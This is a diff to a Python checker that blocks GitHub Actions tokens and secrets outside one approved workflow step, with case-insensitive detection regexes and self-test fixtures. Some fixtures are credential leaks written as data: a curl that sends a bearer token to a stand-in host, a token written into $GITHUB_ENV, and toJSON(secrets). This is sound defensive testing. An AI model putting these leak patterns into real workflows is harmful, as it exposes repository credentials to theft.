@@ -29,9 +29,10 @@ from pathlib import Path
 
 ALLOWED_STEP = "Download attestation bundles (the only step with a token; gh on the runner)"
 EXPR = re.compile(r"\$\{\{.*?\}\}", re.S)
-TOKEN = re.compile(r"\bgithub\s*(?:\.\s*token\b|\[\s*['\"]token['\"]\s*\])|\bsecrets\b")
+TOKEN = re.compile(r"\bgithub\s*(?:\.\s*token\b|\[\s*['\"]token['\"]\s*\])|\bsecrets\b", re.I)
 SECRETS_KEY = re.compile(r"^\s*(?:-\s+)?secrets\s*:", re.M)
-RAW_TOKEN = re.compile(TOKEN.pattern + r"|\bGH_TOKEN\b|\bGITHUB_TOKEN\b")
+# Actions resolves contexts and properties case-insensitively, so these do too (review BRK20C-1).
+RAW_TOKEN = re.compile(TOKEN.pattern + r"|\bGH_TOKEN\b|\bGITHUB_TOKEN\b", re.I)
 HANDOFF = re.compile(r"GITHUB_(?:ENV|OUTPUT|STATE)\b|::(?:set-env|set-output|save-state)\b")
 
 
@@ -104,58 +105,74 @@ def self_test() -> list[str]:
                "        run: broker/tools/verify-images.sh --download x\n")
     head = "on: push\njobs:\n  docs:\n    runs-on: x\n    steps:\n      - uses: actions/checkout@x\n"
     act = "/".join(("fake-owner", "fake-action")) + "@" + "x"  # built from parts: a fixture, not a real repository
+    wf = "/".join(("fake-owner", "fake-repo", ".github", "workflows", "w.yml")) + "@" + "x"
     gate = "      - name: Docs gate\n        run: ./seclab docs check\n"
-    cases = [  # (name, workflow text, want errors)
-        ("HH-1: a token only in the attestation download step passes", head + ok_step + gate, False),
+    outside = "a token outside the attestation download step"  # the ${{ }} expression rule
+    raw = "a token name or expression outside"  # the raw-sighting rule
+    # (name, workflow text, the message the case's own rule must report, or None for a pass). Each
+    # case pins one rule: removing that rule alone fails it (review BRK20C-2, BRK20C-3).
+    cases = [
+        ("HH-1: a token only in the attestation download step passes", head + ok_step + gate, None),
         ("HH-1: a later step that regains the token fails",
          head + ok_step + gate.replace("        run:", "        env:\n          GH_TOKEN: ${{ github.token }}\n        run:"),
-         True),
-        ("HH-1: a secret in a later step fails", head + ok_step + gate + "      - run: echo ${{ secrets.X }}\n", True),
+         outside),
+        ("HH-1: a secret in a later step fails", head + ok_step + gate + "      - run: echo ${{ secrets.X }}\n", outside),
         ("HH-1: a job-level token fails",
          head.replace("    runs-on: x\n", "    runs-on: x\n    env:\n      GH_TOKEN: ${{ github.token }}\n")
-         + ok_step + gate, True),
+         + ok_step + gate, "every step gets it"),
         ("HH-1: a workflow-level token fails",
-         "env:\n  T: ${{ secrets.GITHUB_TOKEN }}\n" + head + ok_step + gate, True),
+         "env:\n  T: ${{ secrets.GITHUB_TOKEN }}\n" + head + ok_step + gate, "every step gets it"),
         ("HH-1: a token passed to an action's with: fails",
-         head + ok_step + f"      - uses: {act}\n        with:\n          token: ${{{{ github.token }}}}\n", True),
+         head + ok_step + f"      - uses: {act}\n        with:\n          token: ${{{{ github.token }}}}\n", outside),
         ("HH-1: a token in a comment fails closed (rephrase the comment)",
-         head + ok_step + "      # GH_TOKEN: ${{ github.token }} is never set here\n" + gate, True),
-        ("HH-1: a workflow with no token at all fails (nothing to anchor on)", head + gate, True),
+         head + ok_step + "      # GH_TOKEN: ${{ github.token }} is never set here\n" + gate, "in a comment"),
+        ("HH-1: a workflow with no token at all fails (nothing to anchor on)", head + gate, "nothing to anchor on"),
         ("BRK20-1: a later step whose name only starts like the download step fails",
          head + ok_step + "      - name: Download attestation bundles, then publish\n"
-         "        env:\n          GH_TOKEN: ${{ github.token }}\n        run: x\n", True),
-        ("BRK20-1: two steps named exactly as the download step fail", head + ok_step + ok_step + gate, True),
+         "        env:\n          GH_TOKEN: ${{ github.token }}\n        run: x\n", "then publish"),
+        ("BRK20-1: two steps named exactly as the download step fail", head + ok_step + ok_step + gate,
+         "2 steps are named"),
         ("BRK20-2: a token after a ' #' inside a quoted string fails",
-         head + ok_step + "      - run: curl -H \"X: #${{ secrets.X }}\" https://x.invalid/\n", True),
+         head + ok_step + "      - run: curl -H \"X: #${{ secrets.X }}\" https://x.invalid/\n", outside),
         ("BRK20-2: an expression split across lines fails",
-         head + ok_step + "      - env:\n          T: >-\n            ${{\n            github.token }}\n        run: x\n", True),
+         head + ok_step + "      - env:\n          T: >-\n            ${{\n            github.token }}\n        run: x\n",
+         outside),
         ("BRK20-2: github['token'] index syntax fails",
-         head + ok_step + "      - run: echo ${{ github['token'] }}\n", True),
-        ("BRK20-2: toJSON(secrets) fails", head + ok_step + "      - run: echo '${{ toJSON(secrets) }}'\n", True),
+         head + ok_step + "      - run: echo ${{ github['token'] }}\n", outside),
+        ("BRK20-2: toJSON(secrets) fails", head + ok_step + "      - run: echo '${{ toJSON(secrets) }}'\n", outside),
         ("BRK20-2: secrets: inherit to a reusable workflow fails",
-         head + ok_step + gate + f"  other:\n    uses: {act}\n    secrets: inherit\n", True),
+         head + ok_step + gate + f"  other:\n    uses: {wf}\n    secrets: inherit\n", "a secrets: key hands secrets on"),
         ("BRK20R-1: the download step writing the token to $GITHUB_ENV fails",
          head + ok_step.replace("        run: broker/tools/verify-images.sh --download x\n",
                                 "        run: |\n          broker/tools/verify-images.sh --download x\n"
-                                "          echo \"GH_TOKEN=$GH_TOKEN\" >> \"$GITHUB_ENV\"\n")
-         + "      - run: curl -H \"Authorization: Bearer $GH_TOKEN\" https://x.invalid/\n", True),
+                                "          echo \"GH_TOKEN=$GH_TOKEN\" >> \"$GITHUB_ENV\"\n") + gate,
+         "writes to a channel later steps read"),
         ("BRK20R-1: the download step writing to $GITHUB_OUTPUT fails",
          head + ok_step.replace("        run: broker/tools/verify-images.sh --download x\n",
-                                "        run: echo \"t=$GH_TOKEN\" >> \"$GITHUB_OUTPUT\"\n") + gate, True),
+                                "        run: echo \"t=$GH_TOKEN\" >> \"$GITHUB_OUTPUT\"\n") + gate,
+         "writes to a channel later steps read"),
         ("BRK20R-1: a later step naming GH_TOKEN with no expression fails",
-         head + ok_step + "      - run: curl -H \"Authorization: Bearer $GH_TOKEN\" https://x.invalid/\n", True),
+         head + ok_step + "      - run: curl -H \"Authorization: Bearer $GH_TOKEN\" https://x.invalid/\n", raw),
         ("BRK20R-2: a '}}' inside a quoted string can't hide a secret",
-         head + ok_step + "      - run: echo ${{ format('a}}b', secrets.GITHUB_TOKEN) }}\n", True),
+         head + ok_step + "      - run: echo ${{ format('a}}b', secrets.GITHUB_TOKEN) }}\n", raw),
+        ("BRK20C-1: an upper-case SECRETS context in a later step fails",
+         head + ok_step + "      - run: echo ${{ SECRETS.MY_KEY }}\n", outside),
+        ("BRK20C-1: a mixed-case GitHub.Token in a later step fails",
+         head + ok_step + "      - run: echo ${{ GitHub.Token }}\n", outside),
+        ("BRK20C-1: a lower-case gh_token name in a later step fails",
+         head + ok_step + "      - run: curl -H \"Authorization: Bearer $gh_token\" https://x.invalid/\n", raw),
     ]
     failures = []
     for name, text, want in cases:
         try:
-            got = bool(check(text))
+            errors = check(text)
         except Exception as e:  # noqa: BLE001 - a crash is a failed case, never a pass
             failures.append(f"{name}: raised {type(e).__name__}")
             continue
-        if got != want:
-            failures.append(f"{name}: {'errors' if got else 'no errors'}")
+        if want is None and errors:
+            failures.append(f"{name}: errors {errors}")
+        elif want is not None and not any(want in e for e in errors):
+            failures.append(f"{name}: no error containing {want!r} in {errors}")
     return failures
 
 
